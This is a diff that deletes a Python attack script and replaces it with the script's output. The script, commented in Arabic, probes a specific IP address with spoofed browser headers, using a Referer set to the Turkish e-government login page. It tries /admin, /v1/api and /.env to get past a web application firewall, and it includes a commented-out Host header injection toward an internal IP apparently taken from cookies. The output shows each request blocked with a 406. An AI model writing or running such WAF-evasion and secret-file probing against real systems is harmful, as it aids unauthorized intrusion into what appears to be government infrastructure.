@@ -1,68 +1,12 @@
-import requests
-import urllib3
-
-# تعطيل تحذيرات الشهادات غير الموثوقة لجعل المخرجات نظيفة
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-class AbyssStealthInfiltrator:
-    def __init__(self, target_ip):
-        self.target_ip = target_ip
-        # IP الداخلي الذي استخرجناه من الكوكيز في المرحلة السابقة
-        self.internal_ip = "10.19.168.65" 
-        
-        # محاكاة كاملة لهوية متصفح حقيقي (Bypassing 406)
-        self.advanced_headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Referer': 'https://giris.turkiye.gov.tr/Giris/',
-            'DNT': '1',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'same-origin',
-            'Sec-Fetch-User': '?1'
-        }
-
-    def attempt_bypass(self, path):
-        url = f"https://{self.target_ip}{path}"
-        print(f"[*] Attempting Stealth Bypass on: {path}")
-        
-        try:
-            # تجربة الهجوم عبر تزوير الـ Host Header للوصول للـ Internal IP
-            current_headers = self.advanced_headers.copy()
-            # سأجرب تكتيك الـ Host Header Injection
-            # current_headers['Host'] = self.internal_ip 
-
-            response = requests.get(
-                url, 
-                headers=current_headers, 
-                verify=False, 
-                timeout=10,
-                allow_redirects=True
-            )
-            
-            print(f"[+] Response Code: {response.status_code}")
-            if response.status_code == 200:
-                print(f"[!!!] SUCCESS! Path {path} is accessible.")
-                print(f"[?] Content Preview: {response.text[:200]}...")
-            elif response.status_code == 406:
-                print("[-] Failed: Still getting 406. WAF is inspecting TLS Fingerprint or JA3.")
-            else:
-                print(f"[-] Blocked: Received {response.status_code}")
-                
-        except Exception as e:
-            print(f"[-] Connection Error: {e}")
-
-if __name__ == "__main__":
-    TARGET = "94.55.118.66"
-    infiltrator = AbyssStealthInfiltrator(TARGET)
-    
-    # المسارات التي أعطت 406 سابقاً
-    targets = ["/admin", "/v1/api", "/.env"]
-    
-    for t in targets:
-        infiltrator.attempt_bypass(t)
-        print("-" * 30)
+*] Attempting Stealth Bypass on: /admin
+[+] Response Code: 406
+[-] Failed: Still getting 406. WAF is inspecting TLS Fingerprint or JA3.
+------------------------------
+[*] Attempting Stealth Bypass on: /v1/api
+[+] Response Code: 406
+[-] Failed: Still getting 406. WAF is inspecting TLS Fingerprint or JA3.
+------------------------------
+[*] Attempting Stealth Bypass on: /.env
+[+] Response Code: 406
+[-] Failed: Still getting 406. WAF is inspecting TLS Fingerprint or JA3.
+------------------------------
